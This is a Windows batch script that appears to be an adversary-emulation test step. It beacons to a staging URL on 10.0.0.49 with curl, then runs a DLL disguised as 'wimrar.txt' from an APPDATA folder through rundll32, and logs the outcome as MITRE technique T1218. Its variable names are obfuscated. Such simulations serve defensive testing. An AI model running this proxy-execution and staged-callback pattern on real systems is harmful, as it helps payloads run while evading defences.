@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET douyiw=%APPDATA%\10205\0c0b54c7
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?10205-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=wimrar.txt
SET rgnpbq=10205

SET logdir=%APPDATA%\!fkesh!
SET logfile=!logdir!\macula-simulations.log
SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!frytcn!"
echo [!tsvar!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_complete>> "!logfile!" 2>nul

cd /d "!douyiw!" >nul 2>&1
echo [!tsvar!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

SET vbnmf=0
SET kjhgf=
echo [!tsvar!][DEBUG][!eykalkg!][!rgnpbq!]: rundll32_start>> "!logfile!" 2>nul
rundll32.exe !ecrfwq!,DllMain
IF !errorlevel! NEQ 0 (
    SET vbnmf=1
    SET kjhgf=rundll32_failed
)
SET qwert=!DATE:~-4,4!-!DATE:~-10,2!-!DATE:~-7,2! !TIME:~0,8!.!TIME:~9,2!
echo [!qwert!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed Binary Proxy Execution=!vbnmf!:!kjhgf!>> "!logdir!\macula-simulations.log" 2>nul
echo [!tsvar!][DEBUG][!eykalkg!][!rgnpbq!]: ttp_logged>> "!logfile!" 2>nul
ENDLOCAL